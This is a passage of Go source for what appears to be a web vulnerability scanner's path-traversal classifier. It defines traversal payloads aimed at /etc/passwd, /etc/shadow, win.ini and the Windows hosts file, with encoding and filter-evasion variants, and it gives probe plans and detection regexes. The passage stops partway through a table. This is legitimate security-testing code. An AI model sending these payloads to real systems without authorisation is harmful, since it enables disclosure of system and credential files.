package triageclasses

import (
	"bytes"
	"fmt"
	"net/url"
	"regexp"
	"strconv"
	"strings"

	"ars0n-framework-v2-server/utils/triage"
)

// CLASS TRAVERSAL (id 13). PATH TRAVERSAL: input is concatenated into a path, and the resolved
// path leaves the directory the application intended.
//
// WHAT IS BEING PROVEN, AND WHAT IS NOT. The identity of the file that comes back is EVIDENCE,
// not the claim. A traversal that escapes into a sibling tenant's upload directory is the same
// bug as one that reaches /etc/passwd, and the second is only easier to prove. This class exists
// to say POINT lfimap HERE, with the winning encoder, the winning depth, the OS family and the
// disclosed document root already in hand, so the confirmation tool starts from a known-good
// vector instead of from its whole wordlist.
//
// WHY IT IS NOT LFI. Every payload in this class contains a dot-dot in some encoding, and no
// payload in LFI contains one in any encoding. The two classes answer different questions (did it
// ESCAPE, versus did it OPEN) and they need different confirmation, so they get different
// payloads, different markers and different verdicts. Neither ever reads the other's response.
//
// DEPTH IS FIXED AT 8 AND THERE IS NO LADDER BY DEFAULT. ".." at the filesystem root is the root
// on both POSIX and Win32, so one deep payload covers every realistic nesting; a ladder buys only
// filter evasion and filter evasion is the confirmation tool's job. Depths 3 and 12 are for the
// blocked case and are left to the tool.
//
// THE ENCODER VARIANTS ARE ENCODER MODES, NOT PAYLOAD TEXT, and this is measured rather than
// assumed. VERIFIED on Go 1.26.1: url.QueryEscape("../../etc/passwd") == "..%2F..%2Fetc%2Fpasswd",
// so in a query, form, cookie or header slot the "plain" and the "URL-encoded" variants arrive as
// the SAME BYTES. Planning both and counting two tests is fabricated coverage, and pct_once is
// therefore requested only on a path slot, where the plain form genuinely goes out raw. Also
// VERIFIED: QueryEscape(QueryEscape(x)) triple-encodes, so a class that writes percent signs into
// its own payload bytes sends garbage. Double encoding is an encoder LAYER requested by name.

type traversalClassifier struct{ faNoSettle }

func init() { triage.RegisterClassifier(traversalClassifier{}) }

func (traversalClassifier) ID() triage.ClassID { return triage.ClassTraversal }

// ---------------------------------------------------------------------------------------------
// PAYLOADS
// ---------------------------------------------------------------------------------------------

// trvDepth8 is "../" eight times, the 24 bytes every escape payload in this class is built on.
const trvDepth8 = "../../../../../../../../"

// trvOverlong is the overlong UTF-8 dot-dot-slash, CARRIED AS BYTES.
//
// THIS IS THE REASON ProbeSpec.Logical IS []byte AND NOT string. VERIFIED: writing the payload as
// a Go string literal containing U+00C0 U+00AE makes QueryEscape emit %C3%80%C2%AE, which is the
// UTF-8 encoding of those two runes and is NOT the overlong sequence. The overlong variant would
// then never be tested while the run recorded that it was: a false negative that looks like
// coverage. Built byte by byte here so that cannot happen.
var trvOverlong = func() []byte {
	unit := []byte{0xC0, 0xAE, 0xC0, 0xAE, 0x2F}
	out := make([]byte, 0, len(unit)*8+len("etc/passwd"))
	for i := 0; i < 8; i++ {
		out = append(out, unit...)
	}
	return append(out, []byte("etc/passwd")...)
}()

// trvNullTrunc is the legacy null-truncation payload: the target, a real NUL byte, then whatever
// extension the application appends. A NUL cannot be written into a header value or a cookie, so
// this payload is not_reachable on those two points and says so rather than being quietly dropped.
var trvNullTrunc = func() []byte {
	out := []byte(trvDepth8 + "etc/passwd")
	out = append(out, 0x00)
	return append(out, []byte(faTokExt)...)
}()

const (
	trvDEC  triage.ProbeID = "TR-DEC"
	trvT0   triage.ProbeID = "TR-T0"
	trvT1L  triage.ProbeID = "TR-T1L"
	trvT1W  triage.ProbeID = "TR-T1W"
	trvT1H  triage.ProbeID = "TR-T1H"
	trvT2L  triage.ProbeID = "TR-T2L"
	trvT2W  triage.ProbeID = "TR-T2W"
	trvT3   triage.ProbeID = "TR-T3"
	trvT4   triage.ProbeID = "TR-T4"
	trvT4b  triage.ProbeID = "TR-T4b"
	trvT5   triage.ProbeID = "TR-T5"
	trvT6   triage.ProbeID = "TR-T6"
	trvT7   triage.ProbeID = "TR-T7"
	trvT8   triage.ProbeID = "TR-T8"
	trvT9   triage.ProbeID = "TR-T9"
	trvT10  triage.ProbeID = "TR-T10"
	trvT11  triage.ProbeID = "TR-T11"
	trvC1   triage.ProbeID = "TR-C1"
	trvC3a  triage.ProbeID = "TR-C3a"
	trvNC1  triage.ProbeID = "TR-NC1"
	trvNC2  triage.ProbeID = "TR-NC2"
	trvNC4  triage.ProbeID = "TR-NC4"
	trvMPF  triage.ProbeID = "TR-MPF"
	trvNone triage.ProbeID = ""
)

// trvValuePoints is the six insertion points every value-shaped payload in this class reaches.
var trvValuePoints = []triage.SlotKind{
	triage.KindQuery, triage.KindBody, triage.KindPath, triage.KindHeader, triage.KindCookie,
}

var trvValueEncoders = []triage.EncoderMode{
	triage.EncodeQuery, triage.EncodeForm, triage.EncodeJSONString, triage.EncodePathSegment,
	triage.EncodeHeaderValue, triage.EncodeCookie, triage.EncodeMultipartValue,
	triage.EncodePctTwice, triage.EncodeIISUnicode,
}

// Probes declares every payload this class will ever send.
//
// TR-C1 CARRIES THREE ROLES AND IS CHARGED ONCE, which is stated here rather than discovered by
// somebody counting requests. Its bytes are the depth-8 escape to a filename that cannot exist,
// and that single response answers: the P- half of the filename-tracking confirmation pair, the
// content-signature negative control (a hit means the signature is matching an echo or a canned
// page), and the ENOENT arm of the blind three-way. Sending it three times would be three
// requests proving the same thing.
func (traversalClassifier) Probes() []triage.ProbeSpec {
	c := triage.ClassTraversal
	full := triage.TierFull
	return []triage.ProbeSpec{
		{
			ID: trvDEC, Class: c, Logical: []byte(faTokValue + "%74%72%2d%64%65%63%2d%31%33"),
			Encoders: trvValueEncoders, Points: trvValuePoints, Tier: triage.TierReduced, Risk: triage.RiskR0,
			Notes: "THIS CLASS'S OWN decode probe (ruling R6a), and the percent text decodes to " +
				"tr-dec-13, which is this class's and nobody else's. The catalogue's row percent-encodes " +
				"the MARKER, which cannot be written as a template because the marker is minted per run: " +
				"two classes writing ${v} plus the percent-encoded marker would ship byte-equal templates " +
				"and fail the isolation check at build time. A class-unique canary keeps the probe " +
				"perturbed, class-owned and distinguishable, and the marker still rides along for " +
				"attribution. Divergence from the catalogue row, on purpose, recorded here.",
		},
		{
			ID: trvT0, Class: c, Logical: []byte(faTokMarker + "/../" + faTokValue),
			Encoders: trvValueEncoders, Points: trvValuePoints, MarkerPos: triage.MarkerInline,
			Tier: triage.TierReduced, Risk: triage.RiskR0,
			Notes: "the self-neutralising escape probe, and also a free OS oracle. VERIFIED on " +
				"Windows 11: reading <dir>\\doesnotexist\\..\\real.txt returns real.txt, because Win32 " +
				"canonicalises .. lexically before touching the filesystem. POSIX resolves each component " +
				"in turn and a nonexistent intermediate yields ENOENT. So a 404 here says posix and a " +
				"same-as-baseline says win32, at no extra request. It has four outcomes and NONE of them " +
				"is clean, and it never suppresses another probe: gating the class on T0 would recreate " +
				"the shared-gate failure inside one class.",
		},
		{
			ID: trvT1L, Class: c, Logical: []byte(trvDepth8 + "etc/passwd"),
			Encoders: trvValueEncoders, Points: trvValuePoints, MarkerPos: triage.MarkerInline,
			Tier: triage.TierReduced, Risk: triage.RiskR0,
			Notes: "the Linux canonical target. Safe to read, present on every Linux host, and its " +
				"signature is anchored at line start so it cannot match prose about it.",
		},
		{
			ID: trvT1W, Class: c, Logical: []byte(trvDepth8 + "windows/win.ini"),
			Encoders: trvValueEncoders, Points: trvValuePoints, MarkerPos: triage.MarkerInline,
			Tier: triage.TierReduced, Risk: triage.RiskR0,
			Notes: "the Windows canonical target. Both OS families are ALWAYS sent: the Server header " +
				"and T0's OS hint order the payloads, they never gate them, because a class that sent " +
				"only the Linux ladder at a Windows host would record a clean it never measured.",
		},
		{
			ID: trvT1H, Class: c, Logical: []byte(trvDepth8 + "windows/system32/drivers/etc/hosts"),
			Encoders: trvValueEncoders, Points: trvValuePoints, MarkerPos: triage.MarkerInline,
			Tier: full, Risk: triage.RiskR0,
			Notes: "second Windows signature, so C2's two-unrelated-signatures rule has something to " +
				"pair win.ini with. VERIFIED exact on Windows 11 Pro 10.0.26200, and note the file opens " +
				"with a UTF-8 BOM, which is why the signature is anchored at a LINE start and not at " +
				"offset 0.",
		},
		{
			ID: trvT2L, Class: c, Logical: []byte(faTokDir + trvDepth8 + "etc/passwd"),
			Encoders: trvValueEncoders, Points: trvValuePoints, MarkerPos: triage.MarkerInline,
			Tier: full, Risk: triage.RiskR0,
			Notes: "start-of-path validation: an application checking that the value begins with its " +
				"own directory prefix. Skipped with a named reason when the observed value has no '/', " +
				"because DIR(V) is then empty and this renders byte-identical to T1L.",
		},
		{
			ID: trvT2W, Class: c, Logical: []byte(faTokDir + trvDepth8 + "windows/win.ini"),
			Encoders: trvValueEncoders, Points: trvValuePoints, MarkerPos: triage.MarkerInline,
			Tier: full, Risk: triage.RiskR0,
			Notes: "the Windows twin of T2L, same skip rule.",
		},
		{
			ID: trvT3, Class: c, Logical: []byte(trvDepth8 + "proc/version"),
			Encoders: trvValueEncoders, Points: trvValuePoints, MarkerPos: triage.MarkerInline,
			Tier: full, Risk: triage.RiskR0,
			Notes: "the second Linux signature, and the one target that needs no appended extension " +
				"to be interesting. It is a /proc pseudo-file, so an empty body with Content-Length: 0 " +
				"is proc_zero_length and NOT a silent detector: Go's transport cannot read past " +
				"Content-Length on HTTP/1.1, which is a genuine limit of the runner and is recorded.",
		},
		{
			ID: trvT4, Class: c, Logical: []byte("....//....//....//....//....//....//....//....//etc/passwd"),
			Encoders: trvValueEncoders, Points: trvValuePoints, MarkerPos: triage.MarkerInline,
			Tier: full, Risk: triage.RiskR0,
			Notes: "a non-recursive stripper removes '../' once and leaves '../' behind.",
		},
		{
			ID: trvT4b, Class: c, Logical: []byte(`....\/....\/....\/....\/....\/....\/....\/....\/etc/passwd`),
			Encoders: trvValueEncoders, Points: trvValuePoints, MarkerPos: triage.MarkerInline,
			Tier: full, Risk: triage.RiskR0,
			Notes: "the backslash-mixed form of the same trick, for a stripper that folds separators " +
				"before it strips rather than after.",
		},
		{
			ID: trvT5, Class: c, Logical: []byte(`..\..\..\..\..\..\..\..\windows\win.ini`),
			Encoders:  trvValueEncoders,
			Points:    []triage.SlotKind{triage.KindQuery, triage.KindBody, triage.KindHeader, triage.KindCookie},
			MarkerPos: triage.MarkerInline, Tier: full, Risk: triage.RiskR0,
			Notes: "the Windows separator, which defeats a filter that only knows '../'. VERIFIED: " +
				"url.Parse(\"https://h/app/..\\\\..\\\\windows\\\\win.ini\").RequestURI() emits %5C, so a RAW " +
				"backslash is unreachable in a path segment and this probe is not_reachable " +
				"(path_backslash_raw) there. It is deliverable in query, form, header and cookie.",
		},
		{
			ID: trvT6, Class: c, Logical: trvOverlong,
			Encoders:  trvValueEncoders,
			Points:    []triage.SlotKind{triage.KindQuery, triage.KindHeader, triage.KindCookie, triage.KindPath},
			MarkerPos: triage.MarkerInline, Tier: full, Risk: triage.RiskR0,
			Notes: "overlong UTF-8, carried as bytes. NOT deliverable in a JSON string: 0xC0 0xAE is " +
				"not valid UTF-8 and RFC 8259 requires the document to be valid UTF-8, so on a JSON body " +
				"slot this is not_reachable (json_utf8) and the plan note says it ran on the vector's " +
				"query, header and cookie slots instead.",
		},
		{
			ID: trvT7, Class: c, Logical: []byte("..;/..;/..;/..;/..;/..;/..;/..;/etc/passwd"),
			Encoders:  []triage.EncoderMode{triage.EncodePathSegment},
			Points:    []triage.SlotKind{triage.KindPath},
			Overrides: triage.SlotOverrides{PathSemicolonRaw: true},
			MarkerPos: triage.MarkerInline, Tier: full, Risk: triage.RiskR0,
			Notes: "nginx in front of a Servlet container. VERIFIED: the default percent-encoding of " +
				"';' in a path segment turns this into ..%3B%2F..%3B%2F, which is sent, recorded as sent, " +
				"and cannot possibly work. The per-payload PathSemicolonRaw override is what makes this " +
				"a test rather than a silent zero. In a cookie it is not_applicable " +
				"(cookie_no_matrix_params): ';' is the cookie separator, so there are no matrix params " +
				"to reach.",
		},
		{
			ID: trvT8, Class: c, Logical: trvNullTrunc,
			Encoders:  trvValueEncoders,
			Points:    []triage.SlotKind{triage.KindQuery, triage.KindBody, triage.KindPath},
			MarkerPos: triage.MarkerInline, Tier: full, Risk: triage.RiskR0,
			Notes: "legacy null truncation of an appended extension, PHP < 5.3.4 and some old Java. " +
				"A NUL is not field-vchar and is not cookie-octet, so this is not_reachable (header_nul) " +
				"and (cookie_nul) on those two points. Go's transport refuses an invalid header value " +
				"LOUDLY, which is TransportInvalidHeader, and that refusal is a recorded unknown rather " +
				"than a silent skip.",
		},
		{
			ID: trvT9, Class: c, Logical: []byte(faTokSibling + "/../" + faTokValue),
			Encoders: trvValueEncoders, Points: trvValuePoints, MarkerPos: triage.MarkerInline,
			Tier: full, Risk: triage.RiskR0,
			Notes: "the escape that involves no operating-system file at all: an object-store key, an " +
				"internal API route, or a template name. A passwd ladder is blind to this entire family, " +
				"and on a modern SPA-plus-object-store deployment it is the family that is actually " +
				"there. Scored on the JSON key set and the structural token set, never on a file " +
				"signature.",
		},
		{
			ID: trvT10, Class: c, Logical: []byte(trvDepth8 + "etc/"),
			Encoders: trvValueEncoders, Points: trvValuePoints, MarkerPos: triage.MarkerInline,
			Tier: full, Risk: triage.RiskR0,
			Notes: "a Java servlet container serving a directory listing. Needs three or more known " +
				"filenames, no <form, and a body under 64 KiB, or a documentation page listing those " +
				"names fires it.",
		},
		{
			ID: trvT11, Class: c,
			Logical:  append([]byte("a/"+trvDepth8+"etc/passwd"), bytes.Repeat([]byte("/."), 1000)...),
			Encoders: trvValueEncoders, Points: trvValuePoints, MarkerPos: triage.MarkerInline,
			Tier: triage.TierOptIn, Risk: triage.RiskR1,
			Notes: "PHP < 5.3 path truncation, 4001 bytes, DEFAULT OFF. It is bounded (exactly 1000 " +
				"repetitions, computed once at init, never in a loop at send time) and it is opt-in " +
				"because 4 KiB in one parameter trips WAFs, fills logs and yields on almost nothing " +
				"still running. Off is a not_run with a reason, never a clean.",
		},
		{
			ID: trvC1, Class: c, Logical: []byte(trvDepth8 + "etc/" + faTokMarker),
			Encoders: trvValueEncoders, Points: trvValuePoints, MarkerPos: triage.MarkerInline,
			Tier: triage.TierReduced, Risk: triage.RiskR0, IsControl: true,
			Notes: "THREE ROLES, ONE REQUEST. (1) the P- half of the filename-tracking pair: the " +
				"signature must fire on T1L and be SILENT here, which proves the response tracks the " +
				"FILENAME and not the traversal sequence and kills the WAF-page and payload-echo families " +
				"at once. (2) the content-signature negative control: a hit here makes every content " +
				"verdict on this slot cannot_determine (signature_unsound). (3) the ENOENT arm of the " +
				"blind three-way. Charged once.",
		},
		{
			ID: trvC3a, Class: c, Logical: []byte(trvDepth8 + "etc/shadow"),
			Encoders: trvValueEncoders, Points: trvValuePoints, MarkerPos: triage.MarkerInline,
			Tier: full, Risk: triage.RiskR0,
			Notes: "the EACCES arm of the blind three-way: a file that exists and that a web user " +
				"cannot read. NOTHING IS READ. /etc/shadow is never disclosed; only the CLASS of error " +
				"is observed, and the probe is an ordinary read that fails. Not time based, and it is " +
				"the only thing this class has when the file is read and never returned.",
		},
		{
			ID: trvNC1, Class: c, Logical: []byte("./" + faTokValue),
			Encoders: trvValueEncoders, Points: trvValuePoints, MarkerPos: triage.MarkerInline,
			Tier: triage.TierReduced, Risk: triage.RiskR0, IsControl: true,
			Notes: "a single dot is not an escape. This must reproduce the slot's local baseline and " +
				"fire no content signature. It validates the escape-mechanics rule: without it, an " +
				"application that 404s on any unfamiliar value makes T0's differential meaningless.",
		},
		{
			ID: trvNC2, Class: c, Logical: []byte(faTokMarker + "/" + faTokValue),
			Encoders: trvValueEncoders, Points: trvValuePoints, MarkerPos: triage.MarkerInline,
			Tier: full, Risk: triage.RiskR0, IsControl: true,
			Notes: "a nonexistent subdirectory, so it must DIFFER from baseline. If it comes back " +
				"SAME, the slot ignores its value entirely and every traversal verdict on it is " +
				"cannot_determine (value_ignored). This is the negative control most scanners omit and " +
				"it is the one that separates a real clean from a parameter the application discards.",
		},
		{
			ID: trvNC4, Class: c, Logical: []byte(trvDepth8 + faTokMarker + "/win.ini"),
			Encoders: trvValueEncoders, Points: trvValuePoints, MarkerPos: triage.MarkerInline,
			Tier: full, Risk: triage.RiskR0, IsControl: true,
			Notes: "validates the WINDOWS signatures specifically. The directory cannot exist, so a " +
				"win.ini signature firing here means it is matching something other than a real read.",
		},
		{
			ID: trvMPF, Class: c, Logical: []byte(faTokMarker + "/../" + faTokValue + ".orig"),
			Encoders:  []triage.EncoderMode{triage.EncodeMultipartName},
			Points:    []triage.SlotKind{triage.KindBody},
			MarkerPos: triage.MarkerInline, Tier: full, Risk: triage.RiskR1,
			Notes: "the multipart filename sub-slot, READ SIDE ONLY. The upload filename is the " +
				"classic traversal sink and it is a WRITE path: a successful escape there overwrites a " +
				"file outside the upload directory, which is destructive and is refused. So this probe " +
				"targets nothing outside the upload directory and only observes whether the response " +
				"echoes a normalised or a raw name. T1 through T8 on this sub-slot are " +
				"not_probed (write_side_destructive), which is an unknown and is printed as one.",
		},
	}
}

// ---------------------------------------------------------------------------------------------
// REACHABILITY
// ---------------------------------------------------------------------------------------------

// Reaches. A path sink can be built from anything the application concatenates, so this class
// declines almost nothing, and the one thing it declines it declines for a structural reason.
//
// THE PROXY ARGUMENT IS WHY IT COVERS FIVE POINTS AND NOT ONE. nginx, an ALB and CloudFront all
// normalise the request path before the origin sees it, so a path-slot traversal frequently never
// arrives, while the identical payload in a query, form, JSON, header or cookie slot is untouched
// by any of them. A traversal class that probes only path slots misses most of a real corpus, and
// on the measured corpus behind this design there were 51 path vectors and ZERO derived path
// slots, so a path-only class would have sent nothing at all.
func (traversalClassifier) Reaches(k triage.SlotKind, mt triage.MediaType) triage.Reachability {
	switch k {
	case triage.KindQuery:
		return triage.Reachability{Reach: triage.ReachAlways}
	case triage.KindHeader:
		return triage.Reachability{
			Reach: triage.ReachConditional,
			Reason: "every payload but T8 is field-vchar, so the NUL-truncation probe is " +
				"not_reachable (header_nul) here while the rest are deliverable raw. X-Original-URL and " +
				"X-Rewrite-URL are a path sink on IIS and on several reverse proxies even when no " +
				"captured parameter is one",
		}
	case triage.KindCookie:
		return triage.Reachability{
			Reach: triage.ReachConditional,
			Reason: "no traversal payload needs a space, a comma or a double quote, so the cookie is " +
				"a comfortable point; ';' must be %3B so T7 is not_applicable (cookie_no_matrix_params) " +
				"and a NUL is impossible so T8 is not_reachable (cookie_nul)",
		}
	case triage.KindBody:
		return triage.Reachability{
			Reach: triage.ReachConditional,
			Reason: "a JSON string slot takes everything except T6, whose 0xC0 0xAE is not valid UTF-8 " +
				"and cannot appear in a conforming JSON document (not_reachable json_utf8); a JSON " +
				"number slot is json_string_coerced only and a 400 there is type_rejection and never " +
				"clean; a multipart filename is read-side only; a part Content-Type is " +
				"not_applicable (no_path_sink). Media type seen: " + string(mt),
		}
	case triage.KindPath:
		return triage.Reachability{
			Reach: triage.ReachConditional,
			Reason: "this is the one point where the encoder variants genuinely differ, so pct_once is " +
				"requested here and nowhere else; it is conditional on THIS CLASS'S OWN decode probe and " +
				"on the shared route and percent controls, because a 404 from a route that no longer " +
				"resolves is the single largest source of fake clean results in a path-slot traversal " +
				"scan. A raw backslash cannot survive url.Parse, so T5 is not_reachable " +
				"(path_backslash_raw)",
		}
	case triage.KindFragment:
		return triage.Reachability{
			Reach:  triage.ReachNever,
			Reason: "the fragment is never transmitted, so no server-side path is ever built from it",
		}
	default:
		return triage.Reachability{
			Reach:  triage.ReachNever,
			Reason: "slot kind " + string(k) + " is not in the model this class was written against",
		}
	}
}

// ---------------------------------------------------------------------------------------------
// PLAN
// ---------------------------------------------------------------------------------------------

// trvNameOrder is the ORDERING hint only. Nothing in this class is suppressed by a name.
var trvNameOrder = regexp.MustCompile(`(?i)(file|path|dir|folder|page|doc|document|template|view|include|require|load|read|open|download|attach|name|src|target|log|report|export|image|img)`)

// Plan is the ladder. Five probes minimum, seventeen typical, and every skip is named.
func (c traversalClassifier) Plan(ctx triage.PlanCtx) []triage.ProbeRequest {
	if _, ok := faEligibleSlot(ctx.Slot); !ok {
		return nil
	}
	if !ctx.Route.Resolved() {
		// A route that did not resolve makes every 404 unattributable. Sending anyway is how a
		// path-slot scan manufactures clean results.
		return nil
	}
	if ctx.Prelude.Failed() {
		return nil
	}
	if ctx.Budget.Exhausted() {
		return nil
	}

	sub := faSubstFor(ctx.Slot)
	sub.Sibling = trvSiblingRoute(ctx.Vector.ComposedURL)
	key := ctx.Slot.Key
	kind := ctx.Slot.Kind
	own := faOwn(ctx.Own)

	switch ctx.Round {
	case 0:
		// The five-probe minimum plus this class's own decode probe. T0 and NC1 first because
		// they are what make everything after them interpretable.
		return []triage.ProbeRequest{
			faReq(trvDEC, key, sub),
			faReq(trvT0, key, sub),
			faReq(trvNC1, key, sub),
			faReq(trvT1L, key, sub),
			faReq(trvT1W, key, sub),
			faReq(trvC1, key, sub),
		}
	case 1:
		if trvStopEarly(own) {
			return nil
		}
		reqs := []triage.ProbeRequest{
			faReq(trvNC2, key, sub),
			faReq(trvNC4, key, sub),
			faReq(trvT1H, key, sub),
			faReq(trvT3, key, sub),
			faReq(trvT4, key, sub),
			faReq(trvT4b, key, sub),
			faReq(trvT10, key, sub),
			faReq(trvT9, key, sub),
		}
		// T2L and T2W are skipped, with a reason, when DIR(V) is empty: they would render
		// byte-identical to T1L and T1W and two requests would be charged for one test.
		if sub.Dir != "" {
			reqs = append(reqs, faReq(trvT2L, key, sub), faReq(trvT2W, key, sub))
		}
		if kind != triage.KindPath {
			reqs = append(reqs, faReq(trvT5, key, sub))
		}
		if kind != triage.KindBody || ctx.Slot.BodyMedia != triage.BodyJSON {
			reqs = append(reqs, faReq(trvT6, key, sub))
		}
		if kind != triage.KindHeader && kind != triage.KindCookie {
			reqs = append(reqs, faReq(trvT8, key, sub))
		}
		if kind == triage.KindPath {
			reqs = append(reqs, faReq(trvT7, key, sub))
		}
		if kind == triage.KindBody && ctx.Slot.BodyMedia == triage.BodyMultipart {
			reqs = append(reqs, faReq(trvMPF, key, sub))
		}
		return reqs
	case 2:
		if trvStopEarly(own) {
			return nil
		}
		// The encoder sweep. Same logical bytes, different encoder layer, and per the verified
		// encoder facts these are genuinely different wire bytes. pct_once is requested ONLY on a
		// path slot, because everywhere else it is byte-identical to none.
		var reqs []triage.ProbeRequest
		for _, enc := range trvEncoderSweep(kind) {
			s := sub
			s.Encoder = enc
			reqs = append(reqs, faReq(trvT1L, key, s))
		}
		return reqs
	case 3:
		// The blind branch, and it runs only when the content probes were all silent. C1 is
		// already sent and supplies the ENOENT arm, so this costs one request, not three.
		if trvContentFired(own) || trvStopEarly(own) {
			return nil
		}
		return []triage.ProbeRequest{faReq(trvC3a, key, sub)}
	default:
		return nil
	}
}

// trvSweepGaps names the TR-T1L encoder modes this class ASKED FOR on this slot and got no
// response back under.
//
// WHY THE CLASS HAS TO WORK THIS OUT FOR ITSELF. When the encoder refuses a probe, the runner
// records the refusal in its own coverage row and returns before an observation exists, so the
// probe never reaches the vault and never reaches this class. Everything downstream is then built
// out of the probes that DID come back: skips is derived from observations, so it is empty;
// probes_on_the_wire counts observations, so it reports every one of them as having got through;
// and the clean at the end is a clean over a payload set that is quietly one short. Measured
// against the oracle: on /cmdi, /redirect, /ssti and /xss, TR-T1L under iis_unicode came back
// encoder_mode_not_implemented from the encoder, and this class returned clean with an empty
// untested list. A class whose own probe was refused has not finished.
//
// Round 2 asks for TR-T1L once per mode in trvEncoderSweep, and Payload.EncoderChain records the
// mode each response was rendered through, so the difference between the two is a fact this class
// can establish from its own responses with nothing new from the runner.
//
// A MISSING MODE HERE MEANS "NOT TESTED UNDER THAT ENCODER" AND NOTHING NARROWER. It cannot tell
// a refusal apart from a round that never ran, because both leave the same hole, and the reason
// says both rather than picking the likelier one.
func trvSweepGaps(own []faOwnObs, kind triage.SlotKind) []triage.ProbeSkip {
	seen := map[string]bool{}
	for _, o := range own {
		if o.ProbeID != trvT1L {
			continue
		}
		for _, e := range o.Obs.Payload.EncoderChain {
			seen[string(e)] = true
		}
	}
	var out []triage.ProbeSkip
	for _, want := range trvEncoderSweep(kind) {
		if seen[want] {
			continue
		}
		out = append(out, triage.ProbeSkip{ProbeID: trvT1L, Reason: "no_response_under_encoder(" + want +
			"): this class asked for TR-T1L under " + want + " and no response rendered through that " +
			"encoder came back, so it was refused before it was sent or the round that requests it never " +
			"ran. Either way the escape was not tested under " + want + " and the silence of the modes " +
			"that did run says nothing about it"})
	}
	return out
}

// trvUnfinishedReason is the completeness gate, and it is the last thing between this class and a
// clean.
//
// EVERY ENTRY IN skips IS A MEASUREMENT THAT DID NOT HAPPEN: a transport refusal, a template that
// went out unsubstituted, a payload something altered in flight, a wire nobody recorded, or an
// encoder mode that produced no response at all. A clean asserts that this class's own probes ran
// and its own oracles stayed silent, and it cannot assert the first half over a probe that never
// ran. The list used to be attached to the clean verdict as Untested and the verdict still
// rendered green, which is the same pixel for "tested and quiet" and "never sent".
func trvUnfinishedReason(skips []triage.ProbeSkip) string {
	if len(skips) == 0 {
		return ""
	}
	names := make([]string, 0, len(skips))
	for _, s := range skips {
		names = append(names, string(s.ProbeID)+" ("+trvSkipHead(s.Reason)+")")
	}
	return "incomplete: " + strconv.Itoa(len(skips)) + " of this class's own probes produced no honest " +
		"response on this slot [" + strings.Join(names, "; ") + "]. A clean over the probes that did get " +
		"through is a clean about payloads that were never sent, so the untested list is the verdict here " +
		"rather than a footnote to one"
}

// trvSkipHead is the reason up to its first colon, so a list of five skips stays readable while
// the full reason stays in Untested where the operator can read it.
func trvSkipHead(reason string) string {
	if i := strings.IndexByte(reason, ':'); i > 0 {
		return reason[:i]
	}
	return reason
}

// trvEncoderSweep is the per-slot encoder list, and pct_once is absent from every slot but a path
// segment BECAUSE IT WAS MEASURED, not because it seemed redundant.
func trvEncoderSweep(k triage.SlotKind) []string {
	if k == triage.KindPath {
		return []string{string(triage.EncodeLiteralPct), string(triage.EncodePctTwice), string(triage.EncodeIISUnicode)}
	}
	return []string{string(triage.EncodePctTwice), string(triage.EncodeIISUnicode)}
}

// trvStopEarly implements the class's own early exits, all of which are about this class's own
// responses and none of which is "nothing found yet".
//
// A NEGATIVE FROM ONE PAYLOAD SAYS NOTHING ABOUT ANOTHER. The only stops are: a confirmed hit
// (there is nothing left to learn), and a uniform block (there is nothing left to measure).
func trvStopEarly(own []faOwnObs) bool {
	obs := make([]triage.Observation, 0, len(own))
	for _, o := range own {
		obs = append(obs, o.Obs)
	}
	if faUniformBlock(obs, nil) {
		return true
	}
	return trvConfirmedHit(own)
}

// trvContentFired reports whether any content signature fired on any of this class's escape
// payloads. Used only to decide whether the blind branch is worth a request.
func trvContentFired(own []faOwnObs) bool {
	for _, o := range own {
		if o.ProbeID == trvC1 || o.ProbeID == trvNC1 || o.ProbeID == trvNC2 || o.ProbeID == trvNC4 {
			continue
		}
		if p, _ := faMatchSignatures(trvSignatures, o.Obs.Body); len(p) > 0 {
			return true
		}
	}
	return false
}

// trvConfirmedHit is the C1 pair: a signature on a real target and SILENCE on the same depth and
// encoder with a filename that cannot exist.
func trvConfirmedHit(own []faOwnObs) bool {
	neg, ok := faFind(own, trvC1)
	if !ok {
		return false
	}
	if p, _ := faMatchSignatures(trvSignatures, neg.Obs.Body); len(p) > 0 {
		return false // the control fired, so nothing here is confirmed
	}
	return trvContentFired(own)
}

// trvSiblingRoute takes the first path segment of the vector's own URL as the sibling name for
// T9. It uses the CAPTURE and nothing else, which is what keeps this ordering decision out of
// every other class's business.
func trvSiblingRoute(composed string) string {
	u, err := url.Parse(composed)
	if err != nil || u.Path == "" {
		return "admin"
	}
	for _, seg := range strings.Split(strings.Trim(u.Path, "/"), "/") {
		if seg != "" && !strings.Contains(seg, ".") {
			return seg
		}
	}
	return "admin"
}

// ---------------------------------------------------------------------------------------------
// DETECTION
// ---------------------------------------------------------------------------------------------

// trvSignatures is THIS CLASS'S OWN COPY of the anchored content signature table.
//
// Every one is anchored at a line start, and NOT ONE of them shares a substring with any payload
// in this class. That is deliberate and it is what makes the echo case free: "root:x:0:0" and
// "../../etc/passwd" are disjoint, so an application that reflects the payload cannot produce a
// hit however loudly it reflects.
var trvSignatures = []faSignature{
	{Name: "posix.passwd", Re: regexp.MustCompile(`(?m)^root:[^:\n]{0,64}:0:0:`)},
	{Name: "posix.passwd.corroboration", Corroborating: true,
		Re: regexp.MustCompile(`(?m)^(daemon|bin|sys|nobody|sshd|www-data):[^:\n]{0,64}:[0-9]{1,6}:[0-9]{1,6}:`)},
	{Name: "posix.proc.version", Re: regexp.MustCompile(`(?m)^Linux version [0-9]+\.[0-9]+`)},
	{Name: "win.ini", Re: regexp.MustCompile(`(?m)^; for 16-bit app support\r?$`)},
	{Name: "win.ini.fonts", Corroborating: true, Re: regexp.MustCompile(`(?m)^\[fonts\]\r?$`)},
	{Name: "win.ini.mci", Corroborating: true, Re: regexp.MustCompile(`(?m)^\[mci extensions\]\r?$`)},
	{Name: "win.ini.mapi", Corroborating: true, Re: regexp.MustCompile(`(?m)^MAPI=1\r?$`)},
	{Name: "win.hosts", Re: regexp.MustCompile(`(?m)^# This is a sample HOSTS file used by Microsoft TCP/IP for Windows\.`)},
	{Name: "win.bootini", Re: regexp.MustCompile(`(?m)^\[boot loader\]\r?$`)},
}

// trvDisclosure is the path-disclosure table, and it is THE HIGHEST-YIELD ORACLE THIS CLASS HAS
// on a hardened application, because it fires when the application refused to open the file and
// still said so.
//
// A hit needs BOTH the signature absent from the baseline AND a distinctive tail of this probe's
// own payload inside the disclosed path. The second condition is what makes it evidence of
// CONCATENATION rather than evidence of reflection, and without it a shared-hosting error page
// that always says "failed to open stream" fires on every slot in the estate.
var trvDisclosure = []faSignature{
	{Name: "php.stream", Re: regexp.MustCompile(`failed to open stream: (No such file or directory|Permission denied|Operation not permitted)`)},
